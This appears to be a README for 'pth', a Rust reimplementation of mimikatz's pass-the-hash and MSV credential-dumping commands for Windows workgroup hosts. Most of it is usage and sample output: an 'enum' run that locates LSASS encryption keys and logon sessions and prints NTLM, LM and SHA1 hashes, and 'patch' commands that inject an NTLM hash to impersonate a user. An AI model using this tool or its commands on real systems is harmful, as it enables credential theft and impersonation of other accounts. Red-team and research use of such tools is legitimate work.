# pth

mimikatz `sekurlsa::pth` & `sekurlsa::msv` implementations written in pure Rust

It only works on NT6+ WORKGROUP (do not support Kerberos)

Subcommand enum:

```
PS> .\pth.exe enum
Found LSASRV.dll @ 0x7ffd57d40000, size: 0x1a2000
Found IV @ 0x7ffd57eca668, 9243afd6eeed6d0a75263c326ded3073
Found 3DES key @ 0x19bca7b005c: 2290a11290a5373a7a38bd81c745d9e0c301c27fca60783f
Found AES key @ 0x19bca7b028c: 080985062490da583f04b3921863dd6e
Found LogonSessionListCount @ 0x7ffd57ec8980, value: 1
Found LogonSessionList @ 0x7ffd57ec9340
Found 10 logon sessions

=======================================
Authentication Id: 0:997
Session          : 0 
Logon Type       : 5 (Unlock)
Username         : LOCAL SERVICE
Domain           : NT AUTHORITY
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-19

=======================================
Authentication Id: 0:89366
Session          : 1 
Logon Type       : 2 (Network)
Username         : DWM-1
Domain           : Window Manager
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-90-323-0

=======================================
Authentication Id: 0:89338
Session          : 1 
Logon Type       : 2 (Network)
Username         : DWM-1
Domain           : Window Manager
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-90-323-0

=======================================
Authentication Id: 0:996
Session          : 0 
Logon Type       : 5 (Unlock)
Username         : NEMESIS$
Domain           : WORKGROUP
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-20

=======================================
Authentication Id: 0:62742
Session          : 1 
Logon Type       : 2 (Network)
Username         : UMFD-1
Domain           : Font Driver Host
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-96-323-0

=======================================
Authentication Id: 0:62723
Session          : 0 
Logon Type       : 2 (Network)
Username         : UMFD-0
Domain           : Font Driver Host
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:29
SID              : S-1-5-96-323-0

=======================================
Authentication Id: 0:61683
Session          : 0 
Logon Type       : 0 (Undefined)
Username         : <NULL>
Domain           : <NULL>
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:28
SID              : <NULL>

=======================================
Authentication Id: 0:999
Session          : 0 
Logon Type       : 0 (Undefined)
Username         : NEMESIS$
Domain           : WORKGROUP
Logon Server     : <NULL>
Logon Time       : 2021-05-08 09:52:28
SID              : S-1-5-18

=======================================
Authentication Id: 0:0
Session          : 0 
Logon Type       : 0 (Undefined)
Username         : <NULL>
Domain           : <NULL>
Logon Server     : <NULL>
Logon Time       : <NULL>
SID              : <NULL>

=======================================
Authentication Id: 0:135735
Session          : 1 
Logon Type       : 2 (Network)
Username         : iv4n
Domain           : NEMESIS
Logon Server     : NEMESIS
Logon Time       : 2021-05-08 09:52:31
SID              : S-1-5-21-323-0-0-2767160192

        msv: 
            Username: iv4n
            Domain  : NEMESIS
            NTLM    : ffffffffffffffffffffffffffffffff *
            LM      : 00000000000000000000000000000000 
            SHA1    : 0000000000000000000000000000000000000000 

```

Subcommand patch:

```
PS> .\pth.exe patch --ntlm ffffffffffffffffffffffffffffffff --user administrator --domain WORKGROUP --impersonate

PS> .\pth.exe patch --ntlm ffffffffffffffffffffffffffffffff --luid 135735
```

